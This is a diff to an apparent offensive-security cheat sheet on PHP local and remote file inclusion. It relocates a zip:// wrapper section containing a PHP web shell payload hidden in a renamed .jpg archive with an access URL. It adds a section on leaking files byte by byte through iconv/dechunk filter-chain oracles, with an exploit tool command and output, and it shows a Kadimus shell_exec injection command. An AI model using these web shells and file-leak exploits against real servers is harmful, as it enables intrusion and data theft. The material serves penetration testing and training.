@@ -21,11 +21,12 @@
     - [Bypass allow_url_include](#bypass-allow_url_include)
   - [LFI / RFI using wrappers](#lfi--rfi-using-wrappers)
     - [Wrapper php://filter](#wrapper-phpfilter)
-    - [Wrapper zip://](#wrapper-zip)
     - [Wrapper data://](#wrapper-data)
     - [Wrapper expect://](#wrapper-expect)
     - [Wrapper input://](#wrapper-input)
+    - [Wrapper zip://](#wrapper-zip)
     - [Wrapper phar://](#wrapper-phar)
+    - [Wrapper convert.iconv:// and dechunk://](#wrapper-converticonv-and-dechunk)
   - [LFI to RCE via /proc/*/fd](#lfi-to-rce-via-procfd)
   - [LFI to RCE via /proc/self/environ](#lfi-to-rce-via-procselfenviron)
   - [LFI to RCE via upload](#lfi-to-rce-via-upload)
@@ -173,18 +174,6 @@ Also there is a way to turn the `php://filter` into a full RCE.
   ```
 
 
-### Wrapper zip://
-
-1. Create an evil payload: `echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;`
-2. Zip the file
-  ```python
-  zip payload.zip payload.php;
-  mv payload.zip shell.jpg;
-  rm payload.php
-  ```
-3. Upload the archive and access the file using the wrappers: http://example.com/index.php?page=zip://shell.jpg%23payload.php
-
-
 ### Wrapper data://
 
 ```powershell
@@ -216,6 +205,17 @@ Alternatively, Kadimus has a module to automate this attack.
 ```powershell
 ./kadimus -u "https://example.com/index.php?page=php://input%00"  -C '<?php echo shell_exec("id"); ?>' -T input
 ```
+
+### Wrapper zip://
+
+1. Create an evil payload: `echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;`
+2. Zip the file
+  ```python
+  zip payload.zip payload.php;
+  mv payload.zip shell.jpg;
+  rm payload.php
+  ```
+3. Upload the archive and access the file using the wrappers: http://example.com/index.php?page=zip://shell.jpg%23payload.php
 
 
 ### Wrapper phar://
@@ -250,6 +250,36 @@ include('phar://test.phar');
 ```
 
 NOTE: The unserialize is triggered for the phar:// wrapper in any file operation, `file_exists` and many more.
+
+
+### Wrapper convert.iconv:// and dechunk://
+
+- `convert.iconv://`: convert input into another folder (`convert.iconv.utf-16le.utf-8`)
+- `dechunk://`: if the string contains no newlines, it will wipe the entire string if and only if
+the string starts with A-Fa-f0-9
+
+The goal of this exploitation is to leak the content of a file, one character at a time, based on the [DownUnderCTF](https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py) writeup.
+ 
+**Requirements**:
+- Backend must not use `file_exists` or `is_file`.
+- Vulnerable parameter should be in a `POST` request. 
+  - You can't leak more than 135 characters in a GET request due to the size limit
+
+The exploit chain is based on PHP filters: `iconv` and `dechunk`:
+
+1. Use the `iconv` filter with an encoding increasing the data size exponentially to trigger a memory error.
+2. Use the `dechunk` filter to determine the first character of the file, based on the previous error.
+3. Use the `iconv` filter again with encodings having different bytes ordering to swap remaining characters with the first one.
+
+Exploit using [synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit), the script will use either the `HTTP status code: 500` or the time as an error-based oracle to determine the character.
+
+```ps1
+$ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0   
+[*] The following URL is targeted : http://127.0.0.1
+[*] The following local file is leaked : /test
+[*] Running POST requests
+[+] File /test leak is finished!
+```
 
 
 ## LFI to RCE via /proc/*/fd
@@ -416,7 +446,7 @@ Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
 Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
 ```
 
-In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] or /var/lib/php/session/sess_[PHPSESSID] files
+In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] or /var/lib/php/sessions/sess_[PHPSESSID] files
 
 ```javascript
 /var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
@@ -484,3 +514,4 @@ If SSH is active check which user is being used `/proc/self/status` and `/etc/pa
 * [LFI2RCE via PHP Filters - HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)
 * [Solving "includer's revenge" from hxp ctf 2021 without controlling any files - @loknop](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)
 * [PHP FILTERS CHAIN: WHAT IS IT AND HOW TO USE IT - Rémi Matasse - 18/10/2022](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)
+* [PHP FILTER CHAINS: FILE READ FROM ERROR-BASED ORACLE - Rémi Matasse - 21/03/2023](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)
